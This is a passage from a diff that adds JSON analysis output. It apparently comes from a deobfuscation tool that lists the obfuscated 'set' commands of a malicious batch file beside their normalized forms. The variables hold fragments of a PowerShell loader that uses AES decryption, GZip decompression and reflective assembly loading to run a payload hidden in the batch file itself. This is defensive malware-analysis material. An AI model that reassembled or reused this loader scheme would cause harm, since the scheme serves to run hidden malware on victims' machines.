+            "Normalized": "set \"RYWZunfWqV=-joi\""
+          },
+          {
+            "Command": "%CuYg%\"FOhXbwdxdZ%KWxq%'')(\"",
+            "Normalized": "set \"FOhXbwdxdZ='')(\""
+          },
+          {
+            "Command": "%CuYg%\"mpkRSgtcFV%KWxq%n ''\"",
+            "Normalized": "set \"mpkRSgtcFV=n ''\""
+          },
+          {
+            "Command": "%CuYg%\"BUGYpAmddd%KWxq%6esa\"",
+            "Normalized": "set \"BUGYpAmddd=6esa\""
+          },
+          {
+            "Command": "%CuYg%\"lBRWyQvoQd%KWxq%$uNB\"",
+            "Normalized": "set \"lBRWyQvoQd=$uNB\""
+          },
+          {
+            "Command": "%CuYg%\"SyvYyHgerc%KWxq%)) {\"",
+            "Normalized": "set \"SyvYyHgerc=)) {\""
+          },
+          {
+            "Command": "%CuYg%\"VEFEOhcCWS%KWxq%6] -\"",
+            "Normalized": "set \"VEFEOhcCWS=6] -\""
+          },
+          {
+            "Command": "%CuYg%\"ErXcpjwIKC%KWxq%yStr\"",
+            "Normalized": "set \"ErXcpjwIKC=yStr\""
+          },
+          {
+            "Command": "%CuYg%\"lKZxzwhsBz%KWxq%;$re\"",
+            "Normalized": "set \"lKZxzwhsBz=;$re\""
+          },
+          {
+            "Command": "%CuYg%\"vASdYpSKKN%KWxq%tsWi\"",
+            "Normalized": "set \"vASdYpSKKN=tsWi\""
+          },
+          {
+            "Command": "%CuYg%\"JWUqvphrHS%KWxq%esaB\"",
+            "Normalized": "set \"JWUqvphrHS=esaB\""
+          },
+          {
+            "Command": "%CuYg%\"QFHiNsXGyT%KWxq%ct S\"",
+            "Normalized": "set \"QFHiNsXGyT=ct S\""
+          },
+          {
+            "Command": "%CuYg%\"rxXnSEPTyQ%KWxq%ile \"",
+            "Normalized": "set \"rxXnSEPTyQ=ile \""
+          },
+          {
+            "Command": "%CuYg%\"QEtrftGoQb%KWxq%lock\"",
+            "Normalized": "set \"QEtrftGoQb=lock\""
+          },
+          {
+            "Command": "%CuYg%\"iPKCkGzGDD%KWxq%nMod\"",
+            "Normalized": "set \"iPKCkGzGDD=nMod\""
+          },
+          {
+            "Command": "%CuYg%\"WYEkpCNxct%KWxq% Sys\"",
+            "Normalized": "set \"WYEkpCNxct= Sys\""
+          },
+          {
+            "Command": "%CuYg%\"EHHMBWqwZQ%KWxq%gEEc\"",
+            "Normalized": "set \"EHHMBWqwZQ=gEEc\""
+          },
+          {
+            "Command": "%CuYg%\"iMKmSDHVhP%KWxq%NBpQ\"",
+            "Normalized": "set \"iMKmSDHVhP=NBpQ\""
+          },
+          {
+            "Command": "%CuYg%\"GnfcXqLaET%KWxq%IL.D\"",
+            "Normalized": "set \"GnfcXqLaET=IL.D\""
+          },
+          {
+            "Command": "%CuYg%\"IofVwrOZvf%KWxq%w-Ob\"",
+            "Normalized": "set \"IofVwrOZvf=w-Ob\""
+          },
+          {
+            "Command": "%CuYg%\"fJSYpixWJx%KWxq%tS46\"",
+            "Normalized": "set \"fJSYpixWJx=tS46\""
+          },
+          {
+            "Command": "%CuYg%\"cyNZrGxsfL%KWxq%'txe\"",
+            "Normalized": "set \"cyNZrGxsfL='txe\""
+          },
+          {
+            "Command": "%CuYg%\"QvaOwAcijy%KWxq%unct\"",
+            "Normalized": "set \"QvaOwAcijy=unct\""
+          },
+          {
+            "Command": "%CuYg%\"CsdnCHIiBV%KWxq%in '\"",
+            "Normalized": "set \"CsdnCHIiBV=in '\""
+          },
+          {
+            "Command": "%CuYg%\"uWSGpwyuOH%KWxq%).Sp\"",
+            "Normalized": "set \"uWSGpwyuOH=).Sp\""
+          },
+          {
+            "Command": "%CuYg%\"JsbyFkzfFN%KWxq%; };\"",
+            "Normalized": "set \"JsbyFkzfFN=; };\""
+          },
+          {
+            "Command": "%CuYg%\"pOyXVxzoYC%KWxq%('%~f0'\"",
+            "Normalized": "set \"pOyXVxzoYC=('C:\\Users\\al\\Downloads\\script.bat'\""
+          },
+          {
+            "Command": "%CuYg%\"yyCsXPZcHG%KWxq%] -j\"",
+            "Normalized": "set \"yyCsXPZcHG=] -j\""
+          },
+          {
+            "Command": "%CuYg%\"YupmQrkVdE%KWxq%aoL'\"",
+            "Normalized": "set \"YupmQrkVdE=aoL'\""
+          },
+          {
+            "Command": "%CuYg%\"ByQAToqFxd%KWxq% -jo\"",
+            "Normalized": "set \"ByQAToqFxd= -jo\""
+          },
+          {
+            "Command": "%CuYg%\"RcuhFKcUII%KWxq%oin \"",
+            "Normalized": "set \"RcuhFKcUII=oin \""
+          },
+          {
+            "Command": "%CuYg%\"ZNsaHsUbRP%KWxq%$nul\"",
+            "Normalized": "set \"ZNsaHsUbRP=$nul\""
+          },
+          {
+            "Command": "%CuYg%\"zWFoThARuW%KWxq% [Sy\"",
+            "Normalized": "set \"zWFoThARuW= [Sy\""
+          },
+          {
+            "Command": "%CuYg%\"tDlButcNTx%KWxq%..-1\"",
+            "Normalized": "set \"tDlButcNTx=..-1\""
+          },
+          {
+            "Command": "%CuYg%\"jSOmaGSHAE%KWxq%rt]:\"",
+            "Normalized": "set \"jSOmaGSHAE=rt]:\""
+          },
+          {
+            "Command": "%CuYg%\"FWEzExElmz%KWxq%IV =\"",
+            "Normalized": "set \"FWEzExElmz=IV =\""
+          },
+          {
+            "Command": "%CuYg%\"keokFIWIlG%KWxq%y.Cr\"",
+            "Normalized": "set \"keokFIWIlG=y.Cr\""
+          },
+          {
+            "Command": "%CuYg%\"HpNHaqMHBq%KWxq%hy.P\"",
+            "Normalized": "set \"HpNHaqMHBq=hy.P\""
+          },
+          {
+            "Command": "%CuYg%\"naresmfIoY%KWxq%3); \"",
+            "Normalized": "set \"naresmfIoY=3); \""
+          },
+          {
+            "Command": "%CuYg%\"mAvvKQGCEk%KWxq%-1..\"",
+            "Normalized": "set \"mAvvKQGCEk=-1..\""
+          },
+          {
+            "Command": "%CuYg%\"rVEVXmOnuP%KWxq%WXIl\"",
+            "Normalized": "set \"rVEVXmOnuP=WXIl\""
+          },
+          {
+            "Command": "%CuYg%\"TjqUpnRJHX%KWxq%IO.M\"",
+            "Normalized": "set \"TjqUpnRJHX=IO.M\""
+          },
+          {
+            "Command": "%CuYg%\"nBoIATefnx%KWxq%IO.C\"",
+            "Normalized": "set \"nBoIATefnx=IO.C\""
+          },
+          {
+            "Command": "%CuYg%\"ApKcMJqErB%KWxq%])))\"",
+            "Normalized": "set \"ApKcMJqErB=])))\""
+          },
+          {
+            "Command": "%CuYg%\"SHbKeuhmWj%KWxq%($mF\"",
+            "Normalized": "set \"SHbKeuhmWj=($mF\""
+          },
+          {
+            "Command": "%CuYg%\"kOiGTUXaLL%KWxq%'[-1\"",
+            "Normalized": "set \"kOiGTUXaLL='[-1\""
+          },
+          {
+            "Command": "%CuYg%\"qMIsrntlFq%KWxq%iron\"",
+            "Normalized": "set \"qMIsrntlFq=iron\""
+          },
+          {
+            "Command": "%CuYg%\"tAMBOHYgqq%KWxq%Bmor\"",
+            "Normalized": "set \"tAMBOHYgqq=Bmor\""
+          },
+          {
+            "Command": "%CuYg%\"oRXHAjSKSe%KWxq%rypt\"",
+            "Normalized": "set \"oRXHAjSKSe=rypt\""
+          },
+          {
+            "Command": "%CuYg%\"fjYUGjezip%KWxq%Obje\"",
+            "Normalized": "set \"fjYUGjezip=Obje\""
+          },
+          {
+            "Command": "%CuYg%\"IQcBiFoZpE%KWxq%:: '\"",
+            "Normalized": "set \"IQcBiFoZpE=:: '\""
+          },
+          {
+            "Command": "%CuYg%\"BvVdrhFSzX%KWxq%[-1.\"",
+            "Normalized": "set \"BvVdrhFSzX=[-1.\""
+          },
+          {
+            "Command": "%CuYg%\"XqsDlRFZqH%KWxq%($mF\"",
+            "Normalized": "set \"XqsDlRFZqH=($mF\""
+          },
+          {
+            "Command": "%CuYg%\"kjwUHfdNut%KWxq%Ao.L\"",
+            "Normalized": "set \"kjwUHfdNut=Ao.L\""
+          },
+          {
+            "Command": "%CuYg%\"QmLXiIzzOc%KWxq%2reE\"",
+            "Normalized": "set \"QmLXiIzzOc=2reE\""
+          },
+          {
+            "Command": "%CuYg%\"MeTdVBitah%KWxq%'gni\"",
+            "Normalized": "set \"MeTdVBitah='gni\""
+          },
+          {
+            "Command": "%CuYg%\"IoiAqaVMIU%KWxq%p by\"",
+            "Normalized": "set \"IoiAqaVMIU=p by\""
+          },
+          {
+            "Command": "%CuYg%\"CfaLzSyJwX%KWxq%cmij\"",
+            "Normalized": "set \"CfaLzSyJwX=cmij\""
+          },
+          {
+            "Command": "%CuYg%\"zLBGWMhUmK%KWxq%NAo,\"",
+            "Normalized": "set \"zLBGWMhUmK=NAo,\""
+          },
+          {
+            "Command": "%CuYg%\"upphBjwMmy%KWxq%fore\"",
+            "Normalized": "set \"upphBjwMmy=fore\""
+          },
+          {
+            "Command": "%CuYg%\"IosDLSzfht%KWxq%on.G\"",
+            "Normalized": "set \"IosDLSzfht=on.G\""
+          },
+          {
+            "Command": "%CuYg%\"UZNFdGPAxN%KWxq%t('\\\"",
+            "Normalized": "set \"UZNFdGPAxN=t('\\\""
+          },
+          {
+            "Command": "%CuYg%\"FmPCmVOnxB%KWxq%join\"",
+            "Normalized": "set \"FmPCmVOnxB=join\""
+          },
+          {
+            "Command": "%CuYg%\"sQlHBqZQhF%KWxq%$exb\"",
+            "Normalized": "set \"sQlHBqZQhF=$exb\""
+          },
+          {
+            "Command": "%CuYg%\"jCXmiFLAdG%KWxq%beoh\"",
+            "Normalized": "set \"jCXmiFLAdG=beoh\""
+          },
+          {
+            "Command": "%CuYg%\"NeJLyIiyRJ%KWxq%iphe\"",
+            "Normalized": "set \"NeJLyIiyRJ=iphe\""
+          },
+          {
+            "Command": "%CuYg%\"HCMxmsNCMY%KWxq%AesM\"",
+            "Normalized": "set \"HCMxmsNCMY=AesM\""
+          },
+          {
+            "Command": "%CuYg%\"ztypTGEofw%KWxq%ypto\"",
+            "Normalized": "set \"ztypTGEofw=ypto\""
+          },
+          {
+            "Command": "%CuYg%\"pgGFqJnloD%KWxq%spos\"",
+            "Normalized": "set \"pgGFqJnloD=spos\""
+          },
+          {
+            "Command": "%CuYg%\"OczBcMSnME%KWxq%.Tra\"",
+            "Normalized": "set \"OczBcMSnME=.Tra\""
+          },
+          {
+            "Command": "%CuYg%\"zfQBEiCRDT%KWxq%();$\"",
+            "Normalized": "set \"zfQBEiCRDT=();$\""
+          },
+          {
+            "Command": "%CuYg%\"QjYeoZgWgg%KWxq%);$e\"",
+            "Normalized": "set \"QjYeoZgWgg=);$e\""
+          },
+          {
+            "Command": "%CuYg%\"xVMAIaRmSn%KWxq%jc =\"",
+            "Normalized": "set \"xVMAIaRmSn=jc =\""
+          },
+          {
+            "Command": "%CuYg%\"jmsyfKLiHK%KWxq%TkGh\"",
+            "Normalized": "set \"jmsyfKLiHK=TkGh\""
+          },
+          {
+            "Command": "%CuYg%\"oAySAhqmFR%KWxq%mijf\"",
+            "Normalized": "set \"oAySAhqmFR=mijf\""
+          },
+          {
+            "Command": "%CuYg%\"uPrIlGjDRL%KWxq%('Lr\"",
+            "Normalized": "set \"uPrIlGjDRL=('Lr\""
+          },
+          {
+            "Command": "%CuYg%\"iXSvLcdBLM%KWxq%trea\"",
+            "Normalized": "set \"iXSvLcdBLM=trea\""
+          },
+          {
+            "Command": "%CuYg%\"iqBQUpLrKN%KWxq%cbcs\"",
+            "Normalized": "set \"iqBQUpLrKN=cbcs\""
+          },
+          {
+            "Command": "%CuYg%\"ThxBLlqCiX%KWxq%ed;$\"",
+            "Normalized": "set \"ThxBLlqCiX=ed;$\""
+          },
+          {
+            "Command": "%CuYg%\"IExkIrpzsZ%KWxq%md =\"",
+            "Normalized": "set \"IExkIrpzsZ=md =\""
+          },
+          {
+            "Command": "%CuYg%\"sAIuOFnjDH%KWxq%ZipS\"",
+            "Normalized": "set \"sAIuOFnjDH=ZipS\""
+          },
+          {
+            "Command": "%CuYg%\"qBoTrkrQCD%KWxq%ream\"",
+            "Normalized": "set \"qBoTrkrQCD=ream\""
+          },
+          {
+            "Command": "%CuYg%\"sqUZNaKiTf%KWxq%')([\"",
+            "Normalized": "set \"sqUZNaKiTf=')([\""
+          },
+          {
+            "Command": "%CuYg%\"IPvppKfUQn%KWxq%-w h\"",
+            "Normalized": "set \"IPvppKfUQn=-w h\""
+          },
+          {
+            "Command": "%CuYg%\"lLcgZXdXHV%KWxq%engt\"",
+            "Normalized": "set \"lLcgZXdXHV=engt\""
+          },
+          {
+            "Command": "%CuYg%\"YPpcgDhnpS%KWxq%);$u\"",
+            "Normalized": "set \"YPpcgDhnpS=);$u\""
+          },
+          {
+            "Command": "%CuYg%\"WkXISKlJsz%KWxq%semb\"",
+            "Normalized": "set \"WkXISKlJsz=semb\""
+          },
+          {
+            "Command": "%CuYg%\"xjtUGuoBoB%KWxq%pose\"",
+            "Normalized": "set \"xjtUGuoBoB=pose\""
+          },
+          {
+            "Command": "%CuYg%\"vNaelsYiWJ%KWxq%'[-1\"",
+            "Normalized": "set \"vNaelsYiWJ='[-1\""
+          },
+          {
+            "Command": "%CuYg%\"FQHGMlkMeL%KWxq%ment\"",
+            "Normalized": "set \"FQHGMlkMeL=ment\""
+          },
+          {
+            "Command": "%CuYg%\"JxeIOmBpJa%KWxq%;$ex\"",
+            "Normalized": "set \"JxeIOmBpJa=;$ex\""
+          },
+          {
+            "Command": "%CuYg%\"aJusToFwpe%KWxq%'%*'\"",
+            "Normalized": "set \"aJusToFwpe=''\""
+          },
+          {
+            "Command": "%CuYg%\"EhYfuSXgYB%KWxq%.Con\"",
+            "Normalized": "set \"EhYfuSXgYB=.Con\""
+          },
+          {
+            "Command": "%CuYg%\"zWdaTJJVFT%KWxq%emor\"",
+            "Normalized": "set \"zWdaTJJVFT=emor\""
+          },
+          {
+            "Command": "%CuYg%\"rWcKiOvahG%KWxq%ssio\"",
+            "Normalized": "set \"rWcKiOvahG=ssio\""
+          },
+          {
+            "Command": "%CuYg%\"IYGpcxClgh%KWxq%morF\"",
+            "Normalized": "set \"IYGpcxClgh=morF\""
+          },
+          {
+            "Command": "%CuYg%\"hmxJkcgnoj%KWxq%mpre\"",
+            "Normalized": "set \"hmxJkcgnoj=mpre\""
+          },
+          {
+            "Command": "%CuYg%\"IEXYJdAUJf%KWxq%ogra\"",
+            "Normalized": "set \"IEXYJdAUJf=ogra\""
+          },
+          {
+            "Command": "%CuYg%\"LpoElfRpLG%KWxq%ing[\"",
+            "Normalized": "set \"LpoElfRpLG=ing[\""
+          },
+          {
+            "Command": "%CuYg%\"CcMgeiuODL%KWxq%TllA\"",
+            "Normalized": "set \"CcMgeiuODL=TllA\""
+          },
+          {
+            "Command": "%CuYg%\"yUgRDQODfA%KWxq% [Sy\"",
+            "Normalized": "set \"yUgRDQODfA= [Sy\""
+          },
+          {
+            "Command": "%CuYg%\"OHNXqIJsJA%KWxq%m.Se\"",
+            "Normalized": "set \"OHNXqIJsJA=m.Se\""
+          },
+          {
+            "Command": "%CuYg%\"PLkfEEHLjl%KWxq%kw.D\"",
+            "Normalized": "set \"PLkfEEHLjl=kw.D\""
+          },
+          {
+            "Command": "%CuYg%\"kIlrFPDnDf%KWxq%$XTg\"",
+            "Normalized": "set \"kIlrFPDnDf=$XTg\""
+          },
+          {
+            "Command": "%CuYg%\"lXpKnajcUB%KWxq%$mFN\"",
+            "Normalized": "set \"lXpKnajcUB=$mFN\""
+          },
+          {
+            "Command": "%CuYg%\"svWHjTtSxy%KWxq%;$uN\"",
+            "Normalized": "set \"svWHjTtSxy=;$uN\""
+          },
+          {
+            "Command": "%CuYg%\"IpietBALEU%KWxq%);$c\"",
+            "Normalized": "set \"IpietBALEU=);$c\""
+          },
+          {
+            "Command": "%CuYg%\"uDgLYBvQsV%KWxq%h);$\"",
+            "Normalized": "set \"uDgLYBvQsV=h);$\""
+          },
+          {
+            "Command": "%CuYg%\"qfrivoSOtu%KWxq%r();\"",
+            "Normalized": "set \"qfrivoSOtu=r();\""
+          },
+          {
+            "Command": "%CuYg%\"PNNqoSRJWU%KWxq%ispo\"",
+            "Normalized": "set \"PNNqoSRJWU=ispo\""
+          },
+          {
+            "Command": "%CuYg%\"KePeTTnjUP%KWxq%, $m\"",
+            "Normalized": "set \"KePeTTnjUP=, $m\""
+          },
+          {
+            "Command": "%CuYg%\"tkSsZvXQmf%KWxq%cwxL\"",
+            "Normalized": "set \"tkSsZvXQmf=cwxL\""
+          },
+          {
+            "Command": "%CuYg%\"bSvfVvnYob%KWxq% = $\"",
+            "Normalized": "set \"bSvfVvnYob= = $\""
+          },
+          {
+            "Command": "%CuYg%\"QGzVHaAEAJ%KWxq%ull;\"",
+            "Normalized": "set \"QGzVHaAEAJ=ull;\""
+          },
+          {
+            "Command": "%CuYg%\"lmgKVSxUOu%KWxq%1..-\"",
+            "Normalized": "set \"lmgKVSxUOu=1..-\""
+          },
+          {
+            "Command": "%CuYg%\"FaRGIeOpRS%KWxq%;}fu\"",
+            "Normalized": "set \"FaRGIeOpRS=;}fu\""
+          },
+          {
+            "Command": "%CuYg%\"hlrmvhjhEI%KWxq%pQ.C\"",
+            "Normalized": "set \"hlrmvhjhEI=pQ.C\""
+          },
+          {
+            "Command": "%CuYg%\"bmBqltbhGl%KWxq%ty.C\"",
+            "Normalized": "set \"bmBqltbhGl=ty.C\""
+          },
+          {
+            "Command": "%CuYg%\"gJNjcFSLDe%KWxq%onve\"",
+            "Normalized": "set \"gJNjcFSLDe=onve\""
+          },
+          {
+            "Command": "%CuYg%\"bVEddiZDgl%KWxq% 0, \"",
+            "Normalized": "set \"bVEddiZDgl= 0, \""
+          },
+          {
+            "Command": "%CuYg%\"PaQRVdYhEa%KWxq%t]::\"",
+            "Normalized": "set \"PaQRVdYhEa=t]::\""
+          },
+          {
+            "Command": "%CuYg%\"ChDVpCdVUe%KWxq%ctio\"",
+            "Normalized": "set \"ChDVpCdVUe=ctio\""
+          },
+          {
+            "Command": "%CuYg%\"QhCswdTCfC%KWxq%$fzu\"",
+            "Normalized": "set \"QhCswdTCfC=$fzu\""
+          },
+          {
+            "Command": "%CuYg%\"hstvLhynpq%KWxq%Deco\"",
+            "Normalized": "set \"hstvLhynpq=Deco\""
+          },
+          {
+            "Command": "%CuYg%\"uwRLOqUItZ%KWxq%ject\"",
+            "Normalized": "set \"uwRLOqUItZ=ject\""
+          },
+          {
+            "Command": "%CuYg%\"sloDrTyzkV%KWxq%ion \"",
+            "Normalized": "set \"sloDrTyzkV=ion \""
+          },
+          {
+            "Command": "%CuYg%\"FTLlJgFVuX%KWxq%Poin\"",
+            "Normalized": "set \"FTLlJgFVuX=Poin\""
+          },
+          {
+            "Command": "%CuYg%\"XmuZgGdKWf%KWxq%spos\"",
+            "Normalized": "set \"XmuZgGdKWf=spos\""
+          },
+          {
+            "Command": "%CuYg%\"mAqkHrpech%KWxq%S46e\"",
+            "Normalized": "set \"mAqkHrpech=S46e\""
+          },
+          {
+            "Command": "%CuYg%\"XbuRpePuvi%KWxq%EcC \"",
+            "Normalized": "set \"XbuRpePuvi=EcC \""
+          },
+          {
+            "Command": "%CuYg%\"KTpgLfaxYj%KWxq% if \"",
+            "Normalized": "set \"KTpgLfaxYj= if \""
+          },
+          {
+            "Command": "%CuYg%\"tBqOpPbHVL%KWxq%join\"",
+            "Normalized": "set \"tBqOpPbHVL=join\""
+          },
+          {
+            "Command": "%CuYg%\"QOmOBdKOGQ%KWxq%I) {\"",
+            "Normalized": "set \"QOmOBdKOGQ=I) {\""
+          },
+          {
+            "Command": "%CuYg%\"JDSFpANMPG%KWxq% $Wt\"",
+            "Normalized": "set \"JDSFpANMPG= $Wt\""
+          },
+          {
+            "Command": "%CuYg%\"DPZbURzVYe%KWxq%::('\"",
+            "Normalized": "set \"DPZbURzVYe=::('\""
+          },
+          {
+            "Command": "%CuYg%\"IxAgvhZmEk%KWxq%stem\"",
+            "Normalized": "set \"IxAgvhZmEk=stem\""
+          },
+          {
+            "Command": "%CuYg%\"IdEQBkPeaM%KWxq% ([S\"",
+            "Normalized": "set \"IdEQBkPeaM= ([S\""
+          },
+          {
+            "Command": "%CuYg%\"RInpJnksCY%KWxq%L = \"",
+            "Normalized": "set \"RInpJnksCY=L = \""
+          },
+          {
+            "Command": "%CuYg%\"RAvMjaRyLi%KWxq%irtS\"",
+            "Normalized": "set \"RAvMjaRyLi=irtS\""
+          },
+          {
+            "Command": "%CuYg%\"jKknhjURKh%KWxq%curi\"",
+            "Normalized": "set \"jKknhjURKh=curi\""
+          },
+          {
+            "Command": "%CuYg%\"mFMiPlPcwd%KWxq%){$s\"",
+            "Normalized": "set \"mFMiPlPcwd=){$s\""
+          },
+          {
+            "Command": "%CuYg%\"uKLNsLGkvX%KWxq%turn\"",
+            "Normalized": "set \"uKLNsLGkvX=turn\""
+          },
+          {
+            "Command": "%CuYg%\"ASynihEyfo%KWxq%.IO.\"",
+            "Normalized": "set \"ASynihEyfo=.IO.\""
+          },
+          {
+            "Command": "%CuYg%\"wcanrWZKHP%KWxq% cbc\"",
+            "Normalized": "set \"wcanrWZKHP= cbc\""
+          },
+          {
+            "Command": "%CuYg%\"TLFGuiAjed%KWxq%idde\"",
+            "Normalized": "set \"TLFGuiAjed=idde\""
+          },
+          {
+            "Command": "%CuYg%\"mUrsJxEHOZ%KWxq%A=')\"",
+            "Normalized": "set \"mUrsJxEHOZ=A=')\""
+          },
+          {
+            "Command": "%CuYg%\"PJYVALpSMX%KWxq%in $\"",
+            "Normalized": "set \"PJYVALpSMX=in $\""
+          },
+          {
+            "Command": "%CuYg%\"JmuzQfLqHh%KWxq%e();\"",
+            "Normalized": "set \"JmuzQfLqHh=e();\""
+          },
+          {
+            "Command": "%CuYg%\"ofmVYOwNls%KWxq% = $\"",
+            "Normalized": "set \"ofmVYOwNls= = $\""
+          },
+          {
+            "Command": "%CuYg%\"lGCcMZHtLn%KWxq%addi\"",
+            "Normalized": "set \"lGCcMZHtLn=addi\""
+          },
+          {
+            "Command": "%CuYg%\"RJVKYMNpMK%KWxq%addi\"",
+            "Normalized": "set \"RJVKYMNpMK=addi\""
+          },
+          {
+            "Command": "%CuYg%\"SblpPDvcUy%KWxq%n -e\"",
+            "Normalized": "set \"SblpPDvcUy=n -e\""
+          },
+          {
+            "Command": "%CuYg%\"lhNeOhEJVF%KWxq%IL.P\"",
+            "Normalized": "set \"lhNeOhEJVF=IL.P\""
+          },
+          {
+            "Command": "%CuYg%\"BFDtBECcYr%KWxq%zpVA\"",
+            "Normalized": "set \"BFDtBECcYr=zpVA\""
+          },
+          {
+            "Command": "%CuYg%\"ilMoAEXQBI%KWxq% -jo\"",
+            "Normalized": "set \"ilMoAEXQBI= -jo\""
+          },
+          {
+            "Command": "%CuYg%\"rNDIhCpazh%KWxq%$cwx\"",
+            "Normalized": "set \"rNDIhCpazh=$cwx\""
+          },
+          {
+            "Command": "%CuYg%\"PYuuUPxpFo%KWxq%O.Co\"",
+            "Normalized": "set \"PYuuUPxpFo=O.Co\""
+          },
+          {
+            "Command": "%CuYg%\"MkVOsrfmkR%KWxq%S8jN\"",
+            "Normalized": "set \"MkVOsrfmkR=S8jN\""
+          },
+          {
+            "Command": "%CuYg%\"ocZsEEDeqt%KWxq%func\"",
+            "Normalized": "set \"ocZsEEDeqt=func\""
+          },
+          {
+            "Command": "%CuYg%\"bkuPVWlcir%KWxq% [Sy\"",
+            "Normalized": "set \"bkuPVWlcir= [Sy\""
+          },
+          {
+            "Command": "%CuYg%\"ujPeDEAQoS%KWxq%urn_\"",
+            "Normalized": "set \"ujPeDEAQoS=urn_\""
+          },
+          {
+            "Command": "%CuYg%\"XCHTImhwMH%KWxq%CBC;\"",
+            "Normalized": "set \"XCHTImhwMH=CBC;\""
+          },
+          {
+            "Command": "%CuYg%\"yalwUhseWz%KWxq%UzNc\"",
+            "Normalized": "set \"yalwUhseWz=UzNc\""
+          },
+          {
+            "Command": "%CuYg%\"WnNVrVshUs%KWxq% = N\"",
+            "Normalized": "set \"WnNVrVshUs= = N\""
+          },
+          {
+            "Command": "%CuYg%\"uWHnxQVgrF%KWxq%3Udz\"",
+            "Normalized": "set \"uWHnxQVgrF=3Udz\""
+          },
+          {
+            "Command": "%CuYg%\"NvEwsFRrTJ%KWxq%pass\"",
+            "Normalized": "set \"NvEwsFRrTJ=pass\""
+          },
+          {
+            "Command": "%CuYg%\"wBXuCgxiIx%KWxq%l, $\"",
+            "Normalized": "set \"wBXuCgxiIx=l, $\""
+          },
+          {
+            "Command": "%CuYg%\"aONNQXCxMT%KWxq%C.Su\"",
+            "Normalized": "set \"aONNQXCxMT=C.Su\""
+          },
+          {
+            "Command": "%CuYg%\"uaRhZNrgqT%KWxq%.Sec\"",
+            "Normalized": "set \"uaRhZNrgqT=.Sec\""
+          },
+          {
+            "Command": "%CuYg%\"uiIwAdIHzB%KWxq% = [\"",
+            "Normalized": "set \"uiIwAdIHzB= = [\""
+          },
+          {
+            "Command": "%CuYg%\"OTOtGEsozM%KWxq%$sgG\"",
+            "Normalized": "set \"OTOtGEsozM=$sgG\""
+          },
+          {
+            "Command": "%CuYg%\"fmiNazViKq%KWxq%f.Di\"",
+            "Normalized": "set \"fmiNazViKq=f.Di\""
+          },
+          {
+            "Command": "%CuYg%\"AdVJZDLQnc%KWxq%JBWk\"",
+            "Normalized": "set \"AdVJZDLQnc=JBWk\""
+          },
+          {
+            "Command": "%CuYg%\"cvYWxgSzLr%KWxq%iXJI\"",
+            "Normalized": "set \"cvYWxgSzLr=iXJI\""
+          },
+          {
+            "Command": "%CuYg%\"PZsyUwtIzy%KWxq%($gE\"",
+            "Normalized": "set \"PZsyUwtIzy=($gE\""
+          },
+          {
+            "Command": "%CuYg%\"qYJhtLHrvt%KWxq%.-4]\"",
+            "Normalized": "set \"qYJhtLHrvt=.-4]\""
+          },
+          {
+            "Command": "%CuYg%\"OdNSMzEYhp%KWxq%.Dis\"",
+            "Normalized": "set \"OdNSMzEYhp=.Dis\""
+          },
+          {
+            "Command": "%CuYg%\"zywCJTPqXy%KWxq%Fbeo\"",
+            "Normalized": "set \"zywCJTPqXy=Fbeo\""
+          },
+          {
+            "Command": "%CuYg%\"ztAJPivsLy%KWxq%$iXJ\"",
+            "Normalized": "set \"ztAJPivsLy=$iXJ\""
+          },
+          {
+            "Command": "%CuYg%\"bWNxpidIug%KWxq%')($\"",
+            "Normalized": "set \"bWNxpidIug=')($\""
+          },
+          {
+            "Command": "%CuYg%\"AGwjysosXN%KWxq%ject\"",
+            "Normalized": "set \"AGwjysosXN=ject\""
+          },
+          {
+            "Command": "%CuYg%\"GZLyvnqgqI%KWxq%CuNP\"",
+            "Normalized": "set \"GZLyvnqgqI=CuNP\""
+          },
+          {
+            "Command": "%CuYg%\"fYYaQkHGUt%KWxq%saBm\"",
+            "Normalized": "set \"fYYaQkHGUt=saBm\""
+          },
+          {
+            "Command": "%CuYg%\"aSZWFKCFQW%KWxq% (, \"",
+            "Normalized": "set \"aSZWFKCFQW= (, \""
+          },
+          {
+            "Command": "%CuYg%\"pmaSomEMvF%KWxq%6Qs3\"",
+            "Normalized": "set \"pmaSomEMvF=6Qs3\""
+          },
+          {
+            "Command": "%CuYg%\"ZifZuYtQGx%KWxq%A.Di\"",
+            "Normalized": "set \"ZifZuYtQGx=A.Di\""
+          },
+          {
+            "Command": "%CuYg%\"gxPHNUqkPO%KWxq%ng =\"",
+            "Normalized": "set \"gxPHNUqkPO=ng =\""
+          },
+          {
+            "Command": "%CuYg%\"DPRpRVZLNw%KWxq%stem\"",
+            "Normalized": "set \"DPRpRVZLNw=stem\""
+          },
+          {
+            "Command": "%CuYg%\"NqcONlNFAM%KWxq%bjec\"",
+            "Normalized": "set \"NqcONlNFAM=bjec\""
+          },
+          {
+            "Command": "%CuYg%\"EWWBLpGxUt%KWxq%c = \"",
+            "Normalized": "set \"EWWBLpGxUt=c = \""
+          },
+          {
+            "Command": "%CuYg%\"ywAnCaznKU%KWxq%orF'\"",
+            "Normalized": "set \"ywAnCaznKU=orF'\""
+          },
+          {
+            "Command": "%CuYg%\"VSXRNLDvKz%KWxq%));\"",
+            "Normalized": "set \"VSXRNLDvKz=));\""
+          },
+          {
+            "Command": "%CuYg%\"IehHIdWqIM%KWxq%efle\"",
+            "Normalized": "set \"IehHIdWqIM=efle\""
+          },
+          {
+            "Command": "%CuYg%\"eGOuXHDfAL%KWxq% -c \"",
+            "Normalized": "set \"eGOuXHDfAL= -c \""
+          },
+          {
+            "Command": "%CuYg%\"KvxBYPNBmY%KWxq%:PKC\"",
+            "Normalized": "set \"KvxBYPNBmY=:PKC\""
+          },
+          {
+            "Command": "%CuYg%\"OXQTDLBYpZ%KWxq%tem.\"",
+            "Normalized": "set \"OXQTDLBYpZ=tem.\""
+          },
+          {
+            "Command": "%CuYg%\"rkYGywpDGi%KWxq%anag\"",
+            "Normalized": "set \"rkYGywpDGi=anag\""
+          },
+          {
+            "Command": "%CuYg%\"ekxMXNuAcV%KWxq%essi\"",
+            "Normalized": "set \"ekxMXNuAcV=essi\""
+          },
+          {
+            "Command": "%CuYg%\"UQcgvfgxKR%KWxq%em.R\"",
+            "Normalized": "set \"UQcgvfgxKR=em.R\""
+          },
+          {
+            "Command": "%CuYg%\"WUTjbyoIlU%KWxq%nsfo\"",
+            "Normalized": "set \"WUTjbyoIlU=nsfo\""
+          },
+          {
+            "Command": "%CuYg%\"hXqfueLFZj%KWxq%NAo)\"",
+            "Normalized": "set \"hXqfueLFZj=NAo)\""
+          },
+          {
+            "Command": "%CuYg%\"PmYSoPSXvC%KWxq%uJBW\"",
+            "Normalized": "set \"PmYSoPSXvC=uJBW\""
+          },
+          {
